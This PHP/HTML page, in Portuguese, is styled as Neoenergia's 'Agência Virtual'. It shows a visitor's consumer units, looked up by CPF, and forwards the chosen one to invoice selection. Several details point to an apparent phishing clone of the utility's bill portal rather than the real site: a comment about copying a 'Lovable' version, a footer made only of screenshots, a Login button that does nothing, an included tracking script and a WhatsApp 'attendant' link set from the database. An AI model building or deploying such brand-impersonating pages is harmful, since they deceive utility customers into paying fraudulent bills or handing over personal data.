<?php
require_once __DIR__ . '/config.php';
addSecurityHeaders();

// Buscar configuração do WhatsApp
$whatsappAtivo = false;
$whatsappNumero = '';
try {
    $pdo = getConnection();
    $stmt = $pdo->prepare("SELECT valor, ativo FROM configuracoes WHERE chave = 'whatsapp' LIMIT 1");
    $stmt->execute();
    $wppConfig = $stmt->fetch();

    // Cast defensivo: no MySQL pode vir como '0'/'1' ou até string
    $ativo = isset($wppConfig['ativo']) ? (int)$wppConfig['ativo'] : 0;
    $valor = isset($wppConfig['valor']) ? trim((string)$wppConfig['valor']) : '';

    if ($ativo === 1 && $valor !== '') {
        $whatsappAtivo = true;
        $whatsappNumero = $valor;
    }
} catch (Exception $e) {
    // Ignorar erro, manter desativado
}

// Verificar se tem dados na sessão
if (!isset($_SESSION['unidades_consumidoras']) || empty($_SESSION['unidades_consumidoras'])) {
    header("Location: index.php");
    exit;
}

$unidadesConsumidoras = $_SESSION['unidades_consumidoras'];

// Usar protocolo que veio da API (ou gerar se não existir)
$protocolo = $_SESSION['protocolo'] ?? '';
if (empty($protocolo)) {
    $protocolo = date('YmdHis') . rand(1000, 9999);
    $_SESSION['protocolo'] = $protocolo;
}

// Garantir que estado/documento existam mesmo se a sessão falhar (ex.: cookie bloqueado)
$estado = $_SESSION['estado'] ?? (isset($_GET['estado']) ? sanitize($_GET['estado']) : '');
$identificador = $_SESSION['identificador'] ?? (isset($_GET['cpf']) ? sanitize($_GET['cpf']) : '');

// Normalizar documento para dígitos (igual fluxo)
$identificador = preg_replace('/\D/', '', (string)$identificador);

if ($estado && empty($_SESSION['estado'])) {
    $_SESSION['estado'] = $estado;
}
if ($identificador && empty($_SESSION['identificador'])) {
    $_SESSION['identificador'] = $identificador;
}

// Se selecionou uma UC
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['uc'])) {
    $_SESSION['uc_selecionada'] = sanitize($_POST['uc']);
    header("Location: selecionar_fatura.php?estado=" . urlencode($estado) . "&cpf=" . urlencode($identificador));
    exit;
}

// Função para mascarar código UC (mostrar só primeiro e últimos 2 dígitos)
function mascaraCodigo($codigo) {
    $codigo = (string)$codigo;
    if (strlen($codigo) <= 4) return $codigo;
    return substr($codigo, 0, 2) . '****' . substr($codigo, -2);
}

// Função para mascarar endereço (igual à versão Lovable)
function mascaraEndereco($endereco) {
    $endereco = (string)$endereco;
    if (!$endereco || strlen($endereco) <= 10) return $endereco;

    $parts = explode(',', $endereco);
    if (count($parts) > 0) {
        $rua = trim($parts[0]);
        $maskedRua = $rua;

        if (strlen($rua) > 5) {
            $maskedRua = $rua[0] . ' ' . str_repeat('*', min(20, max(1, strlen($rua) - 2))) . substr($rua, -3);
        }

        if (count($parts) > 1) {
            return $maskedRua . ',' . implode(',', array_slice($parts, 1));
        }

        return $maskedRua;
    }

    return $endereco;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neoenergia - Agência Virtual</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/png" href="assets/favicon.png">
    <link rel="stylesheet" href="assets/lovable-base.css">
    <style>
        /* Igual ao Lovable: py-6 */
        .neo-main { padding: 24px 16px; }

        .uc-shell {
            max-width: 28rem; /* ~448px, igual ao max-w-md */
            margin: 0 auto;
        }

        .uc-title {
            line-height: 1.2;
            font-weight: 700;
            margin-bottom: 8px;
            font-size: 28.8px;
            color: #00A443;
            font-family: 'Roboto', system-ui, -apple-system, 'Segoe UI', sans-serif;
        }

        .uc-subtitle {
            font-size: 14px;
            color: var(--muted-foreground);
            margin-bottom: 24px;
        }

        .protocolo-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #F5F5F0;
            border: 1px solid #E5E5E0;
            border-radius: 4px;
            padding: 8px 12px;
            margin-bottom: 16px;
            font-size: 12px;
            color: #615D5A;
        }

        .protocolo-badge strong {
            color: #333;
            font-weight: 600;
        }

        .uc-select-card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 8px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -2px rgba(0, 0, 0, 0.1);
            padding: 24px;
        }

        .uc-select-title {
            font-size: 18px;
            font-weight: 500;
            color: var(--foreground);
            margin-bottom: 16px;
        }

        .uc-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .uc-btn {
            width: 100%;
            text-align: left;
            padding: 16px;
            border: 2px solid var(--neo-green-hex);
            border-radius: 8px;
            background: var(--background);
            cursor: pointer;
            transition: all 0.2s;
        }

        .uc-btn:hover {
            background: rgba(0, 164, 67, 0.05);
        }

        .uc-inner {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .uc-info {
            flex: 1;
        }

        .uc-row {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            padding: 12px 0;
            border-bottom: 1px solid var(--border);
        }

        .uc-row:last-child {
            border-bottom: none;
        }

        .uc-label {
            font-size: 12px;
            text-transform: uppercase;
            font-weight: 500;
            color: var(--muted-foreground);
        }

        .uc-value {
            font-size: 16px;
            font-weight: 400;
            color: var(--foreground);
            text-align: right;
            word-break: break-word;
            max-width: 60%;
        }

        .uc-arrow {
            width: 20px;
            height: 20px;
            color: var(--muted-foreground);
        }

        .uc-btn:hover .uc-arrow {
            color: var(--neo-green-hex);
        }

        .uc-back {
            height: 48px;
            padding: 0 32px;
            border-radius: 9999px;
            font-size: 14px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            background: var(--background);
            color: #6B6560;
            border: 1px solid #D1CCC7;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 24px;
        }

        .uc-back:hover {
            background: var(--muted);
        }
    </style>
    <?php include __DIR__ . '/includes/security.php'; ?>
</head>
<body>
    <header class="neo-header">
        <div class="neo-header-container">
            <div class="neo-header-content">
                <div class="neo-header-left">
                    <button type="button" class="neo-header-menu-btn" aria-label="Abrir menu">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <line x1="4" y1="12" x2="20" y2="12"></line>
                            <line x1="4" y1="6" x2="20" y2="6"></line>
                            <line x1="4" y1="18" x2="20" y2="18"></line>
                        </svg>
                    </button>

                    <img src="assets/logo-neoenergia-header.svg" alt="Distribuidora de Energia" class="neo-header-logo">
                </div>

                <button type="button" class="neo-header-login-btn">
                    Login
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <line x1="5" y1="12" x2="19" y2="12"></line>
                        <polyline points="12 5 19 12 12 19"></polyline>
                    </svg>
                </button>
            </div>
        </div>
    </header>

    <main class="neo-main">
        <div class="uc-shell animate-fade-in-up">
            <div class="protocolo-badge">
                PROTOCOLO: <strong><?= htmlspecialchars($protocolo) ?></strong>
            </div>
            <h1 class="uc-title">Selecione a unidade consumidora</h1>
            <p class="uc-subtitle">Escolha abaixo a unidade consumidora que deseja consultar:</p>

            <section class="uc-select-card">
                <h2 class="uc-select-title">Selecione a Unidade Consumidora</h2>

                <div class="uc-list">
                    <?php foreach ($unidadesConsumidoras as $uc): ?>
                    <form method="POST">
                        <input type="hidden" name="uc" value="<?= htmlspecialchars($uc['codigo']) ?>">
                        <button type="submit" class="uc-btn">
                            <div class="uc-inner">
                                <div class="uc-info">
                                    <div class="uc-row">
                                        <span class="uc-label">Código do Cliente</span>
                                        <span class="uc-value"><?= htmlspecialchars(mascaraCodigo($uc['codigo'])) ?></span>
                                    </div>
                                    <?php if (!empty($uc['endereco'])): ?>
                                    <div class="uc-row">
                                        <span class="uc-label">Endereço</span>
                                        <span class="uc-value"><?= htmlspecialchars(mascaraEndereco($uc['endereco'])) ?></span>
                                    </div>
                                    <?php endif; ?>
                                </div>
                                <svg class="uc-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <polyline points="9,18 15,12 9,6"/>
                                </svg>
                            </div>
                        </button>
                    </form>
                    <?php endforeach; ?>
                </div>
            </section>

            <button type="button" class="uc-back" onclick="window.location.href='index.php?step=identificacao&estado=<?= urlencode($estado) ?>&cpf=<?= urlencode($identificador) ?>'">
                Voltar
            </button>
        </div>
    </main>

    <?php if ($whatsappAtivo && !empty($whatsappNumero)): ?>
    <!-- WhatsApp Button -->
    <a href="https://wa.me/<?= preg_replace('/\D/', '', $whatsappNumero) ?>?text=<?= urlencode('Olá, preciso de atendimento sobre minha fatura.') ?>" 
       target="_blank"
       rel="noopener noreferrer"
       class="whatsapp-float"
       aria-label="Falar no WhatsApp">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
        </svg>
        <span class="whatsapp-text">Falar com atendente</span>
    </a>
    <style>
        .whatsapp-float {
            position: fixed;
            bottom: 24px;
            right: 24px;
            z-index: 50;
            display: flex;
            align-items: center;
            gap: 12px;
            background: #25D366;
            color: white;
            padding: 12px 20px;
            border-radius: 9999px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            transition: all 0.2s;
            text-decoration: none;
        }
        .whatsapp-float:hover {
            background: #20BA5C;
            transform: scale(1.05);
        }
        .whatsapp-text {
            font-weight: 500;
            font-size: 14px;
        }
        @media (max-width: 639px) {
            .whatsapp-text { display: none; }
            .whatsapp-float { padding: 12px; }
        }
    </style>
    <?php endif; ?>

    <footer class="neo-footer">
        <div class="neo-footer-container">
            <img src="assets/footer-mobile.png" alt="Rodapé Neoenergia" class="neo-footer-mobile">
            <img src="assets/footer-desktop.png" alt="Rodapé Neoenergia" class="neo-footer-desktop">
        </div>
    </footer>

<?php include __DIR__ . '/includes/tracking.php'; ?>
<?php include __DIR__ . '/includes/chat-widget.php'; ?>
</body>
</html>
